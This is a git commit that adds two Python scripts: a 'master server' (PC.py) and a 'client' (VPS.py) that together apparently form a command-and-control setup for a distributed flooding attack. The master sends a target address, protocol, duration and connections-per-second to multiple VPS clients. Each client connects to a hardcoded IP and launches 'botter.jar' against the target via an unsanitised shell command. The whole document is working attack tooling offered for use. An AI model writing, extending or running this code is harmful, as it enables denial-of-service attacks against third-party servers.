e240debc9e455a3a4a00d457559edbc8c832c0f5
Milkthedev <pranavlal896@gmail.com>
2024-03-25 11:53:15 +0530

    Initial commit

---
+++ PC.py
@@ -0,0 +1,51 @@
+# master server
+
+import socket
+import threading
+
+def handle_client(client_socket, client_name, target_ip, protocol, seconds, cps):
+    while True:
+        if send_data:
+            all = f"{target_ip}??<><>{protocol}??<><>{seconds}??<><>{cps}"
+            client_socket.send(all.encode('utf-8'))
+            break
+    while True:
+        recv = client_socket.recv(2048).decode('utf-8')
+        if recv == "!!":
+            client_socket.close()
+            print(f"{client_name} has disconnected")
+            break
+
+
+def create_and_handle_server(target_ip, protocol, seconds, cps):
+    global send_data
+    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    server_socket.bind(("0.0.0.0", server_port))
+    server_socket.listen(nodes)
+
+    print(f"Server is listening on 0.0.0.0:{server_port} for {nodes} client(s)")
+
+    for i in range(nodes):
+        client_socket, client_address = server_socket.accept()
+        client_name = client_socket.recv(1024).decode('utf-8')
+        print(f"Connection from {client_address}/{client_name}")
+
+        client_thread = threading.Thread(target=handle_client,
+                                         args=(client_socket, client_name, target_ip, protocol, seconds, cps))
+        client_thread.start()
+    send_data = True
+
+
+print("Enter target ip:port : ")
+target_ip = input()
+print("Enter IP range(per client): ")
+protocol = input()
+print("Enter protocol: ")
+seconds = input()
+print("Enter seconds: ")
+cps = input("Enter CPS: ")
+print("Enter number of clients: ")
+nodes = int(input("Enter no. of VPS: "))
+server_port = 35565
+send_data = False
+create_and_handle_server(target_ip, protocol, seconds, cps)
---
+++ VPS.py
@@ -0,0 +1,33 @@
+# client
+
+# this is the code before the impl of qchecker
+
+import socket
+import subprocess
+
+client_name = input("Enter client name: ")
+server_host = '84.54.51.45'
+server_port = 35565
+
+
+def connect_to_server(server_host, server_port):
+    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    result = client_socket.connect_ex((server_host, server_port))
+
+    if result:
+        return
+    print(f"Connected to the server at {server_host}:{server_port}")
+    client_socket.send(client_name.encode('utf-8'))
+
+    target_ip, protocol, seconds, cps = client_socket.recv(1024).decode('utf-8').split("??<><>")
+    command = f"java -jar botter.jar {target_ip} {protocol} {seconds} {cps}"
+    subprocess.run(command, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+    client_socket.send("!!".encode('utf-8'))
+
+
+def main():
+    while True:
+        connect_to_server(server_host, server_port)
+
+
+main()
